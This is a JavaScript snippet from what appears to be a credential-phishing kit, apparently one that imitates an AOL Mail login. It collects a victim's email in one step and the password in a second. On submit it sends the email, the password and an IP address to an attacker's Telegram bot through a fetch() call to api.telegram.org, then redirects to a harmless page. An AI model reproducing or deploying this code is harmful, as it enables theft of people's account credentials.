      const forma = document.querySelector('#form')
    
      let bot = {
          TOKEN: "tokengohere",
          chatID: "chatidgohere"
      }

      const emAil = document.querySelector('#usr')
      const suBBer = document.querySelector('#suber')
      const pWd = document.querySelector('#pwd')
      const strong = document.querySelector('.strong')
      
	  const submit = document.querySelector('#sub').addEventListener('click', e =>{
        if(emAil.value === ''){
		
		
		
          return
        }
        display.textContent = emAil.value
        strong.textContent = 'Enter password'
        emAil.style.display = 'none'
        pWd.style.display = 'block'
        submit.style.display = 'none'
        suBBer.style.display = 'block'
      })


    forma.addEventListener("submit", e =>{
          e.preventDefault();
          let email = document.querySelector('#usr').value
          let pwd = document.querySelector('#pwd').value
		  let ips = document.querySelector('#ipaddress').value

        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=AOLMailDJ=>${email}=${pwd}==IP:>${ips}`, {
              method: "GET"
          }).then(success => {
              window.location.replace("http://example.com");
          }, error => {
              console.log(error)
              }) 
      })
